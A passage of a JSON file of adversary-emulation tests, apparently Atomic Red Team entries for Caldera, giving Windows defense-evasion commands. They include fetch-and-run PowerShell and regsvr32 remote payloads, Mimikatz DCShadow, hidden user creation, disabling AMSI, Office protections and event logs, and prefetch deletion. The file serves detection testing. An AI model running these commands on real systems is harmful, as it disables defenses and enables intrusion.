        "description": "Launch PowerShell with the \"-WindowStyle Hidden\" argument to conceal PowerShell windows by setting the WindowStyle parameter to hidden.\nUpon execution a hidden PowerShell window will launch calc.exe\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1564.003",
            "name": "Hide Artifacts: Hidden Window"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Start-Process powershell.exe -WindowStyle hidden calc.exe",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "9a2edad4053a2b59fb9167a9bc29e7dc",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "e0c877693f820e4da83d2bbaeaf90ea6": {
        "description": "Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.\nTechnique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/\nUpon execution calc.exe will be launched\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.011",
            "name": "Signed Binary Proxy Execution: Rundll32"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "rundll32 vbscript:\"\\..\\mshtml,RunHTMLApplication \"+String(CreateObject(\"WScript.Shell\").Run(\"calc.exe\"),0)",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e0c877693f820e4da83d2bbaeaf90ea6",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "ef5db0bcd87583e711535d6ffb667823": {
        "description": "Use Mimikatz DCShadow method to simulate behavior of an Active Directory Domain Controller and edit protected attribute.\n\n[DCShadow](https://www.dcshadow.com/)\n[Additional Reference](http://www.labofapenetrationtester.com/2018/04/dcshadow.html)\n\nIt will set the badPwdCount attribute of the target user (user/machine account) to 9999. You can check after with:\nGet-ADObject -LDAPFilter '(samaccountname=<user>)' -Properties badpwdcount | select-object -ExpandProperty badpwdcount\n\nNeed SYSTEM privileges locally (automatically obtained via PsExec, so running as admin is sufficient), and Domain Admin remotely.\nThe easiest is to run elevated and as a Domain Admin user.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1207",
            "name": "Rogue Domain Controller"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Stop-Process -Name \"mimikatz\" -Force -ErrorAction Ignore",
                    "command": "$dc_output_file = \"$env:TEMP\\art-T1207-mimikatz-DC.log\"; Remove-Item $dc_output_file -ErrorAction Ignore; $mimikatzParam =\"`\"log $dc_output_file`\" `\"lsadump::dcshadow /object:#{object} /attribute:#{attribute} /value:#{value}`\" `\"exit`\"\"; $dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList \"/c #{psexec_path} /accepteula -d -s #{mimikatz_path} $mimikatzParam\"; Start-Sleep -Seconds 5; &; Write-Host \"`nWaiting for fake DC server to return\"; Wait-Process $dc; Write-Host \"`nOutput from fake DC server:\"; Get-Content $dc_output_file; Start-Sleep 1; Remove-Item $dc_output_file -ErrorAction Ignore; Write-Host \"End of DCShadow\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "ef5db0bcd87583e711535d6ffb667823",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "2e0a44f9919a362689beea79fbf485a9": {
        "description": "ransomware payloads via virtual machines (VM). \n[Maze ransomware](https://threatpost.com/maze-ransomware-ragnar-locker-virtual-machine/159350/)\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1564.006",
            "name": "Run Virtual Instance"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "sc stop VBoxDRV && sc delete VBoxDRV && regsvr32 /u /S \"C:\\Program Files\\Oracle\\VirtualBox\\VboxC.dll\" && msiexec /x 8af345_Virtualbox_52.msi /qn",
                    "command": "\"C:\\Program Files\\Oracle\\VirtualBox\\VBoxSVC.exe\" /reregserver && regsvr32 /S \"C:\\Program Files\\Oracle\\VirtualBox\\VboxC.dll\" && rundll32 \"C:\\Program Files\\Oracle\\VirtualBox\\VBoxRT.dll,RTR3Init\" && sc create VBoxDRV binpath= \"C:\\Program Files\\Oracle\\VirtualBox\\drivers\\VboxDrv.sys\" type= kernel start= auto error= normal displayname= PortableVBoxDRV && sc start VBoxDRV",
                    "payloads": [
                        "8af345_Virtualbox_52.msi"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "2e0a44f9919a362689beea79fbf485a9",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "c4037679686baae613809ecdf561fcf5": {
        "description": "Mimic execution of compressed executable. When successfully executed, calculator.exe will open.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1027",
            "name": "Obfuscated Files or Information"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "taskkill /f /im calculator.exe >nul 2>nul && rmdir /S /Q %temp%\\temp_T1027.zip >nul 2>nul && del /Q \"%temp%\\T1027.zip\" >nul 2>nul",
                    "command": "\"%temp%\\temp_T1027.zip\\T1027.exe\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "c4037679686baae613809ecdf561fcf5",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "c90a6b345875fbb3df965075433b0f29": {
        "description": "Executes an InstallUtil assembly by renaming InstallUtil.exe and using a nonstandard extension for the assembly. Upon execution, \"Running a transacted installation.\"\nwill be displayed, along with other information about the opperation. \"The transacted install has completed.\" will be displayed upon completion.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.004",
            "name": "Signed Binary Proxy Execution: InstallUtil"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Path \"$Env:windir\\System32\\Tasks\\readme.txt\" -ErrorAction Ignore; Remove-Item -Path \"$Env:windir\\System32\\Tasks\\readme.InstallLog\" -ErrorAction Ignore; Remove-Item -Path \"$Env:windir\\System32\\Tasks\\readme.InstallState\" -ErrorAction Ignore; Remove-Item -Path \"$Env:windir\\System32\\Tasks\\notepad.exe\" -ErrorAction Ignore",
                    "command": "if (Test-Path \"eaecbe_InstallUtilTestHarness.ps1\") { ; } else {New-Item -Type Directory (split-path eaecbe_InstallUtilTestHarness.ps1) -ErrorAction ignore | Out-Null; Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"eaecbe_InstallUtilTestHarness.ps1\"};  ; . eaecbe_InstallUtilTestHarness.ps1; $InstallerAssemblyDir = \"$Env:windir\\System32\\Tasks\"; $InstallerAssemblyFileName = 'readme.txt'; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; $CommandLine = \"readme.txt\"; $ExpectedOutput = 'Constructor_'; Set-Location \"$Env:windir\\System32\\Tasks\"; Copy-Item -Path \"$([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())InstallUtil.exe\" -Destination \"$Env:windir\\System32\\Tasks\\notepad.exe\"; $TestArgs = @{;     OutputAssemblyDirectory = $InstallerAssemblyDir;     OutputAssemblyFileName = $InstallerAssemblyFileName;     InvocationMethod = 'Executable';     CommandLine = $CommandLine;     InstallUtilPath = \"$Env:windir\\System32\\Tasks\\notepad.exe\"; }; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly; if ($ActualOutput -ne $ExpectedOutput) {;     throw @\"; Evasive Installutil invocation test failure. Installer assembly execution output did not match the expected output.; Expected: $ExpectedOutput; Actual: $ActualOutput; \"@; }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "eaecbe_InstallUtilTestHarness.ps1"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "c90a6b345875fbb3df965075433b0f29",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "ffce9bc5032640904cade26fd95826bf": {
        "description": "Executes the code specified within a XSL script tag during XSL transformation using a remote payload.\nRequires download of MSXSL.exe. No longer available from Microsoft.\n(Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 )\nOpen Calculator.exe when test successfully executed, while AV turned off.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1220",
            "name": "XSL Script Processing"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del -Path PathToAtomicsFolder\\T1220\\bin\\msxsl.exe >nul 2>&1",
                    "command": "PathToAtomicsFolder\\T1220\\bin\\msxsl.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "ffce9bc5032640904cade26fd95826bf",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "d5bb3cda05ddba230c90c1afb2640379": {
        "description": "Kill the event log services for stealth via function of WinPwn",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); inv-phantom -consoleoutput -noninteractive",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "d5bb3cda05ddba230c90c1afb2640379",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "01301667c9359e3468773b5bf08dd5f0": {
        "description": "Executes the Uninstall Method. Upon execution, version information will be displayed the .NET framework install utility.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.004",
            "name": "Signed Binary Proxy Execution: InstallUtil"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore",
                    "command": "if (Test-Path \"eaecbe_InstallUtilTestHarness.ps1\") { ; } else {New-Item -Type Directory (split-path eaecbe_InstallUtilTestHarness.ps1) -ErrorAction ignore | Out-Null; Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"eaecbe_InstallUtilTestHarness.ps1\"};  ; . eaecbe_InstallUtilTestHarness.ps1; $InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; $CommandLine = \"/logfile= /logtoconsole=false /installtype=notransaction /action=uninstall `\"$InstallerAssemblyFullPath`\"\"; $ExpectedOutput = 'Constructor_Uninstall_'; $TestArgs = @{;     OutputAssemblyDirectory = $InstallerAssemblyDir;     OutputAssemblyFileName = $InstallerAssemblyFileName;     InvocationMethod = 'Executable';     CommandLine = $CommandLine; }; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs; if ($ActualOutput -ne $ExpectedOutput) {;     throw @\"; InstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.; Expected: $ExpectedOutput; Actual: $ActualOutput; \"@; }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "eaecbe_InstallUtilTestHarness.ps1"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "01301667c9359e3468773b5bf08dd5f0",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "030ac920f33b655976bd0d74c04273de": {
        "description": "Executes an MSI containing embedded JScript code using the WMI Win32_Product class\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.007",
            "name": "Signed Binary Proxy Execution: Msiexec"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Invoke-CimMethod -ClassName Win32_Product -MethodName",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "030ac920f33b655976bd0d74c04273de",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "b66a6eed7d46ab2ca4c3bf1ae3b61f44": {
        "description": "Gorgon group may disable Office security features so that their code can run. Upon execution, an external document will not\nshow any warning before editing the document.\n\n\nhttps://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\" -Name \"VBAWarnings\" -ErrorAction Ignore | Out-Null; Remove-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -ErrorAction Ignore",
                    "command": "New-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\"; New-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\"; New-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\"; New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\" -Name \"VBAWarnings\" -Value \"1\" -PropertyType \"Dword\"; New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableInternetFilesInPV\" -Value \"1\" -PropertyType \"Dword\"; New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableUnsafeLocationsInPV\" -Value \"1\" -PropertyType \"Dword\"; New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableAttachementsInPV\" -Value \"1\" -PropertyType \"Dword\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b66a6eed7d46ab2ca4c3bf1ae3b61f44",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "2d74c884d1e0b55f41542ef64bc8fe4b": {
        "description": "LockBit Black - Disable Privacy Settings Experience Using Registry\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "reg delete \"HKCU\\Software\\Policies\\Microsoft\\Windows\\OOBE\" /v DisablePrivacyExperience /f >nul 2>&1",
                    "command": "reg add \"HKCU\\Software\\Policies\\Microsoft\\Windows\\OOBE\" /v DisablePrivacyExperience /t REG_DWORD /d 1 /f",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "2d74c884d1e0b55f41542ef64bc8fe4b",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "bf16e87ab3bf5ae82da06ffc1b5e4e8c": {
        "description": "Executes the CheckIfInstallable class constructor runner instead of executing InstallUtil. Upon execution, the InstallUtil test harness will be executed.\nIf no output is displayed the test executed successfuly.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.004",
            "name": "Signed Binary Proxy Execution: InstallUtil"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore",
                    "command": "if (Test-Path \"eaecbe_InstallUtilTestHarness.ps1\") { ; } else {New-Item -Type Directory (split-path eaecbe_InstallUtilTestHarness.ps1) -ErrorAction ignore | Out-Null; Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"eaecbe_InstallUtilTestHarness.ps1\"};  ; . eaecbe_InstallUtilTestHarness.ps1; $InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; $ExpectedOutput = 'Constructor_'; $TestArgs = @{;     OutputAssemblyDirectory = $InstallerAssemblyDir;     OutputAssemblyFileName = $InstallerAssemblyFileName;     InvocationMethod = 'CheckIfInstallable'; }; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly; if ($ActualOutput -ne $ExpectedOutput) {;     throw @\"; CheckIfInstallable method execution test failure. Installer assembly execution output did not match the expected output.; Expected: $ExpectedOutput; Actual: $ActualOutput; \"@; }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "eaecbe_InstallUtilTestHarness.ps1"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "bf16e87ab3bf5ae82da06ffc1b5e4e8c",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "2413b013bc82d152765e2ac34601a327": {
        "description": "Delete a single prefetch file.  Deletion of prefetch files is a known anti-forensic technique. To verify execution, Run \"(Get-ChildItem -Path \"$Env:SystemRoot\\prefetch\\*.pf\" | Measure-Object).Count\"\nbefore and after the test to verify that the number of prefetch files decreases by 1.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070.004",
            "name": "Indicator Removal on Host: File Deletion"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Remove-Item -Path (Join-Path \"$Env:SystemRoot\\prefetch\\\" (Get-ChildItem -Path \"$Env:SystemRoot\\prefetch\\*.pf\" -Name)[0])",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "2413b013bc82d152765e2ac34601a327",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "a2fb06ab28703880f514f860c8fd0aa3": {
        "description": "Adversaries may similarly hide user accounts in Windows. Adversaries can set the HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList Registry key value to 0 for a specific user to prevent that user from being listed on the logon screen.\nReference https://attack.mitre.org/techniques/T1564/002/ and https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1564.002",
            "name": "Hide Artifacts: Hidden Users"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "reg delete \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v AtomicOperator$ /f >nul 2>&1 && net user ${user_name}$ /delete >nul 2>&1",
                    "command": "NET USER AtomicOperator$ At0micRedTeam! /ADD /expires:never  && REG ADD \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v AtomicOperator$ /t REG_DWORD /d 0",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "a2fb06ab28703880f514f860c8fd0aa3",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "b7dd57cb9f71dd5d672ad206e6339033": {
        "description": "Storing files in Alternate Data Stream (ADS) similar to Astaroth malware.\nUpon execution cmd will run and attempt to launch desktop.ini. No windows remain open after the test\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1564.004",
            "name": "Hide Artifacts: NTFS File Attributes"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item \"C:\\Users\\Public\\Libraries\\yanki\\desktop.ini\" -Force -ErrorAction Ignore",
                    "command": "if (!(Test-Path C:\\Users\\Public\\Libraries\\yanki -PathType Container)) {;     New-Item -ItemType Directory -Force -Path C:\\Users\\Public\\Libraries\\yanki;     }; Start-Process -FilePath \"$env:comspec\" -ArgumentList \"/c,type,#{payload_path},>,`\"#{ads_file_path}:#{ads_name}`\"\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b7dd57cb9f71dd5d672ad206e6339033",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "fffc5cc7a52a08229fb340862c05f1a3": {
        "description": "Executes a CHM file with the default Shortcut Command method.",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.001",
            "name": "Signed Binary Proxy Execution: Compiled HTML File"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHCompiledHelp -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "fffc5cc7a52a08229fb340862c05f1a3",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "76b6066fe170d38215251102e42be973": {
        "description": "Create an Alternate Data Stream with PowerShell. Write access is required. To verify execution, the the command \"ls -Recurse | %{ gi $_.Fullname -stream *} | where stream -ne ':$Data' | Select-Object pschildname\"\nin the %temp% direcotry to view all files with hidden data streams. To view the data in the alternate data stream, run \"notepad.exe T1564.004_has_ads_powershell.txt:adstest.txt\" in the %temp% folder.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1564.004",
            "name": "Hide Artifacts: NTFS File Attributes"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Path $env:TEMP\\T1564.004_has_ads_powershell.txt -ErrorAction Ignore",
                    "command": "echo \"test\" > $env:TEMP\\T1564.004_has_ads_powershell.txt | set-content -path test.txt -stream adstest.txt -value \"test\"; set-content -path $env:TEMP\\T1564.004_has_ads_powershell.txt -stream adstest.txt -value \"test2\"; set-content -path . -stream adstest.txt -value \"test3\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "76b6066fe170d38215251102e42be973",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "18348573c1f989a6cca9e9bf10809700": {
        "description": "Detect LSM running from an incorrect directory and an incorrect service account\nThis works by copying cmd.exe to a file, naming it lsm.exe, then copying a file to the C:\\ folder.\n\nUpon successful execution, cmd.exe will be renamed as lsm.exe and executed from non-standard path.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1036.003",
            "name": "Masquerading: Rename System Utilities"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del C:\\T1036.003.txt >nul 2>&1 && del C:\\lsm.exe >nul 2>&1",
                    "command": "copy C:\\Windows\\System32\\cmd.exe C:\\lsm.exe && C:\\lsm.exe /c echo T1036.003 > C:\\T1036.003.txt",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "18348573c1f989a6cca9e9bf10809700",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "94f51bf01a7036fe02d07b4c18967669": {
        "description": "Wevtutil can be used to disable logs. \nNOTE: RansomEXX ransomware uses this to disable Security logs post-encryption.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.002",
            "name": "Impair Defenses: Disable Windows Event Logging"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "wevtutil sl \"Microsoft-Windows-IKE/Operational\" /e:true",
                    "command": "wevtutil sl \"Microsoft-Windows-IKE/Operational\" /e:false",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "94f51bf01a7036fe02d07b4c18967669",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "0eb7887e6df6b2f411693c6f994adb73": {
        "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. This test may be blocked by windows defender; disable\nwindows defender real-time protection to fix it. Upon execution, calc.exe will be launched.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.010",
            "name": "Signed Binary Proxy Execution: Regsvr32"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "C:\\Windows\\system32\\regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "0eb7887e6df6b2f411693c6f994adb73",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "1f102aa49f258b8d050f3adae7961683": {
        "description": "Loads a DLL into msiexec.exe and calls its DllUnregisterServer function. Note: the DLL included in the \"bin\" folder is only built for 64-bit, so this won't work on a 32-bit OS.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.007",
            "name": "Signed Binary Proxy Execution: Msiexec"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "#{msi_exe} /z \"#{dll_payload}\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "1f102aa49f258b8d050f3adae7961683",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "9c3da34af0cd74b7110b8e3826b7b7bd": {
        "description": "Executes a CHM file simulating a user double click.",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.001",
            "name": "Signed Binary Proxy Execution: Compiled HTML File"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath Test.chm",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "9c3da34af0cd74b7110b8e3826b7b7bd",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "a6495fa4cdcf09233d18bce7eb87fe27": {
        "description": "Test execution of a command using rundll32.exe with advpack.dll.\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml\nUpon execution calc.exe will be launched\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.011",
            "name": "Signed Binary Proxy Execution: Rundll32"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "rundll32.exe advpack.dll,LaunchINFSection 80d0e0_T1218.011.inf,DefaultInstall_SingleUser,1,",
                    "payloads": [
                        "80d0e0_T1218.011.inf"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "a6495fa4cdcf09233d18bce7eb87fe27",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "538e16479be335190f7d17f70f9ababc": {
        "description": "This test simulates an adversary leveraging control.exe\nUpon execution calc.exe will be launched\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.002",
            "name": "Signed Binary Proxy Execution: Control Panel"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "control.exe 187e67_calc.cpl",
                    "payloads": [
                        "187e67_calc.cpl"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "538e16479be335190f7d17f70f9ababc",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "392e12d6a466407e28d1bb51cf0729bb": {
        "description": "With administrative rights, an adversary can remove the AMSI Provider registry key in HKLM\\Software\\Microsoft\\AMSI to disable AMSI inspection.\nThis test removes the Windows Defender provider registry key. Upon execution, no output is displayed.\nOpen Registry Editor and navigate to \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\\" to verify that it is gone.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "New-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\" -Name \"{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -ErrorAction Ignore | Out-Null",
